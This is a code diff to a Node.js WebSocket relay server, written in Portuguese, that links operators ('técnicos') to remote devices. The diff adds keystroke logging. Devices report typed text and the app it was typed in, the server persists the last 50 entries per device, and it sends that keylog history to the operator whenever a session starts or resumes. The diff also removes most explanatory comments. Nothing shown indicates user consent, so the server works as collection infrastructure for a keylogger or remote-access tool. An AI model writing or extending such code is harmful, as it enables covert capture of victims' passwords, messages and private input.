@@ -15,15 +15,14 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 const DB_FILE = path.join('/tmp', 'clientes_db.json');
+const MAX_KEYS = 50;
 
-// Carrega clientes salvos do disco
 function carregarClientes() {
   try {
     if (fs.existsSync(DB_FILE)) {
       const dados = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
-      dados.forEach(({ token, info }) => {
-        // Volta como offline — ws null até reconectar
-        clientes.set(token, { ws: null, info, tecnicoId: null, ultimaVez: Date.now() });
+      dados.forEach(({ token, info, keylog }) => {
+        clientes.set(token, { ws: null, info, tecnicoId: null, ultimaVez: Date.now(), keylog: keylog || [] });
       });
       console.log(`[DB] ${dados.length} clientes carregados`);
     }
@@ -32,12 +31,11 @@ function carregarClientes() {
   }
 }
 
-// Salva clientes no disco
 function salvarClientes() {
   try {
     const dados = [];
     clientes.forEach((c, token) => {
-      dados.push({ token, info: c.info });
+      dados.push({ token, info: c.info, keylog: c.keylog || [] });
     });
     fs.writeFileSync(DB_FILE, JSON.stringify(dados), 'utf8');
   } catch (e) {
@@ -45,11 +43,9 @@ function salvarClientes() {
   }
 }
 
-// Clientes persistem mesmo offline
-const clientes = new Map(); // token -> { ws, info, tecnicoId, ultimaVez }
-const tecnicos = new Map(); // tecnicoId -> { ws, deviceToken }
+const clientes = new Map();
+const tecnicos = new Map();
 
-// Carrega ao iniciar
 carregarClientes();
 
 function listaClientes() {
@@ -101,14 +97,12 @@ wss.on('connection', (ws, req) => {
     tecnicos.set(tecnicoId, { ws, deviceToken: null });
     console.log(`[TÉCNICO +] ${tecnicoId}`);
 
-    // Envia lista completa incluindo offline
     ws.send(JSON.stringify({ tipo: 'lista_clientes', clientes: listaClientes() }));
 
     ws.on('message', (raw) => {
       let msg; try { msg = JSON.parse(raw); } catch { return; }
       const t = tecnicos.get(tecnicoId);
 
-      // Entrar em sessão com cliente
       if (msg.tipo === 'conectar_cliente' || msg.tipo === 'voltar_cliente') {
         const c = clientes.get(msg.deviceToken);
         if (!c) {
@@ -119,7 +113,6 @@ wss.on('connection', (ws, req) => {
           ws.send(JSON.stringify({ tipo: 'erro', msg: 'Cliente offline' }));
           return;
         }
-        // Libera cliente anterior
         if (t.deviceToken && t.deviceToken !== msg.deviceToken) {
           const anterior = clientes.get(t.deviceToken);
           if (anterior) {
@@ -133,12 +126,17 @@ wss.on('connection', (ws, req) => {
         t.deviceToken = msg.deviceToken;
         c.ws.send(JSON.stringify({ tipo: 'tecnico_conectou' }));
         ws.send(JSON.stringify({ tipo: 'sessao_iniciada', deviceToken: msg.deviceToken, info: c.info }));
+
+        // Envia histórico de keylog ao retomar sessão
+        if (c.keylog && c.keylog.length > 0) {
+          ws.send(JSON.stringify({ tipo: 'keylog_historico', keylog: c.keylog }));
+        }
+
         console.log(`[SESSÃO] Técnico ${tecnicoId} → ${msg.deviceToken}`);
         broadcastTecnicos({ tipo: 'lista_clientes', clientes: listaClientes() });
         return;
       }
 
-      // Sair da sessão atual (voltar para lista)
       if (msg.tipo === 'sair_sessao') {
         if (t.deviceToken) {
           const c = clientes.get(t.deviceToken);
@@ -154,7 +152,6 @@ wss.on('connection', (ws, req) => {
         return;
       }
 
-      // Repassa qualquer outro comando pro cliente atual
       repassarParaCliente(tecnicoId, msg);
     });
 
@@ -178,7 +175,6 @@ wss.on('connection', (ws, req) => {
     const existing = clientes.get(deviceToken);
 
     if (existing) {
-      // Reconexão — atualiza só o WebSocket, preserva info e tecnicoId
       if (existing.ws?.readyState === WebSocket.OPEN) {
         existing.ws.close(1000, 'Reconexão');
       }
@@ -186,19 +182,20 @@ wss.on('connection', (ws, req) => {
       existing.ultimaVez = Date.now();
       console.log(`[CLIENTE ~] Reconectou: ${deviceToken}`);
 
-      // Se tinha técnico ativo, reconecta a sessão
       if (existing.tecnicoId) {
         const t = tecnicos.get(existing.tecnicoId);
         if (t?.ws.readyState === WebSocket.OPEN) {
           ws.send(JSON.stringify({ tipo: 'tecnico_conectou' }));
           t.ws.send(JSON.stringify({ tipo: 'sessao_iniciada', deviceToken, info: existing.info }));
+          if (existing.keylog && existing.keylog.length > 0) {
+            t.ws.send(JSON.stringify({ tipo: 'keylog_historico', keylog: existing.keylog }));
+          }
         } else {
           existing.tecnicoId = null;
         }
       }
     } else {
-      // Novo cliente
-      clientes.set(deviceToken, { ws, info: {}, tecnicoId: null, ultimaVez: Date.now() });
+      clientes.set(deviceToken, { ws, info: {}, tecnicoId: null, ultimaVez: Date.now(), keylog: [] });
       console.log(`[CLIENTE +] Novo: ${deviceToken}`);
       salvarClientes();
     }
@@ -212,10 +209,17 @@ wss.on('connection', (ws, req) => {
       if (msg.tipo === 'info_dispositivo') {
         if (c) {
           c.info = msg.dados;
-          salvarClientes(); // Persiste info atualizada
+          salvarClientes();
           broadcastTecnicos({ tipo: 'lista_clientes', clientes: listaClientes() });
         }
         return;
+      }
+
+      // Salva keylog no servidor (máx 50)
+      if (msg.tipo === 'keylog' && c) {
+        c.keylog = c.keylog || [];
+        c.keylog.push({ texto: msg.texto, app: msg.app, ts: Date.now() });
+        if (c.keylog.length > MAX_KEYS) c.keylog = c.keylog.slice(-MAX_KEYS);
       }
 
       repassarParaTecnico(deviceToken, msg);
@@ -226,8 +230,6 @@ wss.on('connection', (ws, req) => {
       const c = clientes.get(deviceToken);
       if (c) {
         c.ultimaVez = Date.now();
-        // NÃO remove da lista — cliente reconecta em 1.5s
-        // Notifica técnico que cliente ficou offline
         if (c.tecnicoId) {
           const t = tecnicos.get(c.tecnicoId);
           if (t?.ws.readyState === WebSocket.OPEN) {
@@ -240,9 +242,8 @@ wss.on('connection', (ws, req) => {
   }
 });
 
-// Remove clientes que ficaram offline por mais de 1 hora
 setInterval(() => {
-  const limite = Date.now() - 60 * 60 * 1000; // 1 hora
+  const limite = Date.now() - 60 * 60 * 1000;
   let removidos = 0;
   clientes.forEach((c, token) => {
     const offline = !c.ws || c.ws.readyState !== WebSocket.OPEN;
@@ -255,7 +256,7 @@ setInterval(() => {
     console.log(`[LIMPEZA] ${removidos} clientes removidos`);
     broadcastTecnicos({ tipo: 'lista_clientes', clientes: listaClientes() });
   }
-}, 5 * 60 * 1000); // checa a cada 5 minutos
+}, 5 * 60 * 1000);
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`✅ Servidor rodando na porta ${PORT}`));
